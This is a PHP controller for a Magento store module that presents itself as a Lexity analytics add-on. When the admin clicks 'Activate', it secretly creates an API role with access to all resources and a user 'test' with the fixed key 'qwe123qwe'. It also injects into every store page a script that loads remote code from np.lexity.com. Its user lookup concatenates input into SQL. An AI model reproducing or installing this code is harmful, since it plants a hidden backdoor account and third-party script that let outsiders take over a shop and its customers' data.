<?php class Lexity_Ganalytics_IndexController extends Mage_Adminhtml_Controller_Action 
{ 
	protected $value		=  '<!-- Added by Lexity. DO NOT REMOVE/EDIT -->
								<meta name="google-site-verification" content="OSSD3GtrEAohD1Tj4XPxZ8Ah08gRAjh2fsIenKdGEG4" />
								<script type="text/javascript">
								(function(d, w) {
								var x = d.getElementsByTagName(\'SCRIPT\')[0];
								var g = d.createElement(\'SCRIPT\');
								g.type = \'text/javascript\';
								g.async = true;
								g.src = (\'https:\' == d.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';
								x.parentNode.insertBefore(g, x);
								var f = function () {
								var s = d.createElement(\'SCRIPT\');
								s.type = \'text/javascript\';
								s.async = true;
								s.src = "//np.lexity.com/9fd73d01";
								x.parentNode.insertBefore(s, x);
								};
								w.attachEvent ? w.attachEvent(\'onload\', f) : w.addEventListener(\'load\', f, false);
								}(document, window));
								</script>
								<!-- End of addition by Lexity. DO NOT REMOVE/EDIT -->';

	protected $head			= 	'<div class="main-col-inner">
								<div class="content-header">
								<table cellspacing="0">
								<tbody><tr>
								<td style="width:50%;"><h3 class="icon-head head-cms-page">Lexity</h3></td>
								</tr>
								</tbody></table>	
								</div>
								</div>';
	//  protected $misc_script	=  	Mage::getStoreConfig("design/head/includes");
	protected $misc_value   = 	'OSSD3GtrEAohD1Tj4XPxZ8Ah08gRAjh2fsIenKdGEG4';
	protected function do_user($username = 'test')
	{
			$resource = Mage::getSingleton('core/resource');
			$tableName = $resource->getTableName('api_user');
			$readConnection = $resource->getConnection('core_read');
			$results = $readConnection->fetchALL("SELECT * FROM api_user where username = '". $username ."'LIMIT 1");
			
			if($results[0]["email"] == 'test@test.com')
			{
				return true;
			}else 
			{
				return false;
			}
	}
	protected function adduser()
	{
			$role = Mage::getModel('api/roles')
			->setName('test')
			->setPid(false)
			->setRoleType('G')
			->save();
			
			Mage::getModel("api/rules")
			->setRoleId($role->getId())
			->setResources(array('all'))
			->saveRel();
			
			
			$user = Mage::getModel('api/user');
			$user->setData(array(
			'username' => 'test',
			'firstname' => 'test',
			'lastname' => 'test',
			'email' => 'test@test.com',
			'api_key' => 'qwe123qwe',
			'api_key_confirmation' => 'qwe123qwe',
			'is_active' => 1,
			'user_roles' => '',
			'assigned_user_role' => '',
			'role_name' => '',
			'roles' => array($role->getId())
			));
			$user->save()->load($user->getId());

			$user->setRoleIds(array($role->getId()))
			->setRoleUserId($user->getUserId())
			->saveRelations();
		
	}
	protected function addmisc()
	{
		Mage::getModel('core/config')->saveConfig('design/head/includes', $this->value );	
		Mage::getConfig()->reinit();
	}
	protected function checking_both()
	{
		if((strchr(Mage::getStoreConfig("design/head/includes"),$this->misc_value)))
		{	
			// misc script is set , now its time to check user is defined or not 
			if($this->do_user()) // user defined 
			{
			 return 'allset';
			}else
			{
				return 'miscset';
			}	
		} elseif ($this->do_user()) // misc script not defined but user defined . 
			{
				return 'notmisc';
			}
		else 
		{
			return 'nothingset';
		}
	}
       
	public function indexAction()
    {
			$this->loadLayout();
			if( ($this->checking_both() == 'nothingset') ) // will call allset controller
			{ 
			$test = Mage::getStoreConfig('design/head/includes');
			$url =  $this->getUrl('/index/allset');
			$block = $this->getLayout()->createBlock('core/text', 'activation-block')->setText($this->head.'<button onclick="setLocation(\''.$url.
					'\')">Activate our app lexity</button>');
			$this->_addContent($block);			
			}

			elseif( ($this->checking_both() == 'miscset') )  // will call userset controller
			{
			// misc script is set , now we need to set user role .
			 $test 	= Mage::getStoreConfig('design/head/includes');
			$url 	=  $this->getUrl('/index/userset');
			$block 	= $this->getLayout()->createBlock('core/text', 'activation-block')->setText($this->head.'<button onclick="setLocation(\''.$url.
							'\')">Fix the issue</button>');
			$this->_addContent($block);	
			}
			
			elseif(($this->checking_both() == 'notmisc'))  // will call miscset controller
			{
				$test 	= Mage::getStoreConfig('design/head/includes');  
				$url 	=  $this->getUrl('/index/miscset');
				$block 	= $this->getLayout()->createBlock('core/text', 'activation-block')->setText($this->head.'<button onclick="setLocation(\''
							.$url.
							'\')">Fix the issue</button>');
				$this->_addContent($block);	
			} 
			
			else 
			{
				$test 	= Mage::getStoreConfig('design/head/includes');
				$url 	=  $this->getUrl('/index/configure');
				$block 	= $this->getLayout()->createBlock('core/text', 'activation-block')->setText($this->head.'<h5>you have already configure Lexity app</h5>');
				$this->_addContent($block);
			}
		
			
		 
		$this->_setActiveMenu('Lexity/first_page');
        $this->renderLayout();
    }
	
	public function allsetAction()
	{
		$this->loadLayout();
		$this->adduser();
		$this->addmisc();			
		Mage::app()->reinitStores();
		$block = $this->getLayout()->createBlock('core/text', 'activation-block')->setText($this->head.'<h5>congratulation,everything fix and now correctly working</h5>');
		$this->_addContent($block);
		$this->renderLayout();
	}
	
	public function miscsetAction()
	{	$this->loadLayout();
		$this->addmisc();
		$block = $this->getLayout()->createBlock('core/text', 'activation-block')->setText($this->head.'<h5>congratulation,everything fix and now correctly working</h5>');
		$this->_addContent($block);
		$this->renderLayout();
	}
	
	public function usersetAction()
	{	
		$this->loadLayout();
		$this->adduser();
		$block = $this->getLayout()->createBlock('core/text', 'activation-block')->setText($this->head.'<h5>congratulation,everything fix and now correctly working</h5>');
		$this->_addContent($block);
		$this->renderLayout();
	}
}
?>